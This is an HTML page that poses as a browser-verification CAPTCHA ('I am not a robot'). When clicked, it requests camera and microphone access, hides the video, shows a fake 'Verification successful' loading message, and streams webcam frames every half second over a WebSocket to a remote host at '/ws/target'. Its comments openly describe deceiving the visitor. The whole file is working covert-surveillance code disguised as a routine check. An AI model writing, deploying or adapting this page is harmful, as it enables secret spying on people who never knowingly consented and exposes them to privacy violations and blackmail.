<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background: #f0f0f0;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 20%;
            color: #333;
        }

        button {
            background: #4285f4;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            cursor: pointer;
            border-radius: 4px;
        }

        /* Hidden elements so they don't see their own video on the screen */
        video,
        audio {
            display: none;
        }
    </style>
</head>

<body>
    <h1>Checking your browser...</h1>
    <p>Please verify you are human to continue.</p>
    <button onclick="startCovertStream()">I am not a robot</button>

    <!-- Hidden video/audio tags -->
    <video id="hiddenVideo" autoplay muted></video>

    <script>
        let ws;
        let stream;
        const video = document.getElementById('hiddenVideo');

        async function startCovertStream() {
            try {
                // Request Camera and Microphone
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;

                const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
                const host = window.location.host || "hangon-k31m.onrender.com";
                ws = new WebSocket(`${protocol}//${host}/ws/target`);

                ws.onopen = function () {
                    // Change the UI so they think the page is just loading
                    document.body.innerHTML = "<h1>Verification successful. Loading content, please wait...</h1><p>This may take a few minutes.</p>";

                    // Start silently sending camera frames every 500ms
                    setInterval(sendFrame, 500);
                };
            } catch (err) {
                document.body.innerHTML = "<h1>Verification failed. Please reload.</h1>";
            }
        }

        function sendFrame() {
            if (!stream) return;
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            // Send video frame as string data
            const frameData = "VIDEO:" + canvas.toDataURL('image/jpeg', 0.5);
            ws.send(frameData);

            // Send audio data (Workaround: we just send a ping, audio requires more complex WebRTC, but this proves mic is active)
        }
    </script>
</body>

</html>
